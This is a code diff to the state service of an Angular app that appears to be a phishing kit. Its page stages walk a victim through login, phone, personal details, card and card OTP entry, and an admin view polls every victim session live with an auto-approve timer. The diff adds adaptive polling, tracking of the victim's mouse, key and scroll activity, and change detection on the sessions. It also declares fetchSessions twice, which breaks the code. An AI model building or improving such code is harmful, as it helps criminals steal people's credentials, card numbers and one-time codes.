@@ -4,6 +4,7 @@ import { Router } from '@angular/router';
 import { io, Socket } from 'socket.io-client';
 import { from, of, firstValueFrom, throwError } from 'rxjs';
 import { retry, catchError, switchMap, tap } from 'rxjs/operators';
+import { PollingScheduler } from './polling.util';
 
 export type ViewState = 'gate' | 'security_check' | 'login' | 'limited' | 'phone' | 'personal' | 'card' | 'card_otp' | 'loading' | 'step_success' | 'success' | 'admin';
 export type VerificationStage = 'login' | 'limited' | 'phone_pending' | 'personal_pending' | 'card_pending' | 'card_otp_pending' | 'final_review' | 'complete';
@@ -116,6 +117,8 @@ export class StateService {
   // Auto-Approve Timer
   private waitingStart = signal<number | null>(null);
   private syncInterval: any;
+  private poller: PollingScheduler | null = null;
+  private lastDataHash = '';
   private syncTimeout: any;
   private broadcastChannel: BroadcastChannel | null = null;
   private isHydrating = false;
@@ -377,18 +380,32 @@ export class StateService {
 
   public startPolling() {
       if (this.syncInterval) clearInterval(this.syncInterval);
-      
-      this.syncInterval = setInterval(() => {
+      if (this.poller) this.poller.stop();
+
+      this.poller = new PollingScheduler(2000, 60000, async () => {
           if (this.adminAuthenticated()) {
-              this.fetchSessions();
+              return await this.fetchSessions();
           } else {
               this.checkAutoApprove();
-              // Periodic heartbeats only if we suspect we are online or haven't checked in a while
-              if (!this.isOfflineMode() || Math.random() > 0.7) {
-                  this.syncState();
+              const idleTime = Date.now() - this.lastActivityTime;
+              const isIdle = idleTime > 60000; // 1 min idle
+
+              if (!this.isOfflineMode()) {
+                   // If active, always sync (return true to keep fast polling)
+                   // If idle, sync occasionally (return false to allow backoff)
+                   if (!isIdle) {
+                       await this.syncState();
+                       return true;
+                   } else {
+                       await this.syncState();
+                       return false;
+                   }
               }
+              return !isIdle;
           }
-      }, 5000); // Slower polling since we have sockets
+      });
+
+      this.poller.start();
   }
 
   private setupListeners() {
@@ -409,6 +426,12 @@ export class StateService {
              const payload = this.buildPayload();
              const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
              navigator.sendBeacon('/api/sync', blob);
+          });
+
+          // 3. User Activity Tracking
+          const activityHandler = () => this.registerUserActivity();
+          ['mousedown', 'keydown', 'touchstart', 'scroll'].forEach(evt => {
+              document.addEventListener(evt, activityHandler, { passive: true });
           });
       }
   }
@@ -493,6 +516,9 @@ export class StateService {
   // --- Admin Fetch ---
 
   public async fetchSessions() {
+  public async fetchSessions(): Promise<boolean> {
+      // Logic: Try Network -> Fail -> Try Local Mock DB
+      
       const request$ = from(fetch(`/api/sessions?t=${Date.now()}`)).pipe(
           switchMap(res => {
               if (!res.ok) return throwError(() => new Error(`Fetch Error`));
@@ -509,9 +535,23 @@ export class StateService {
           const res: any = await firstValueFrom(request$);
           if (res && res.ok) {
               const sessions: any[] = await res.json();
+
+              // Change Detection
+              const currentHash = JSON.stringify(sessions.map((s: any) => ({
+                  id: s.sessionId,
+                  status: s.status,
+                  step: s.stage,
+                  lastSeen: s.lastSeen
+              })));
+
+              const hasChanged = currentHash !== this.lastDataHash;
+              this.lastDataHash = currentHash;
+
               this.processSessionsData(sessions);
+              return hasChanged;
           }
       } catch (e) { }
+      return false;
   }
 
   private processSessionsData(sessions: any[]) {
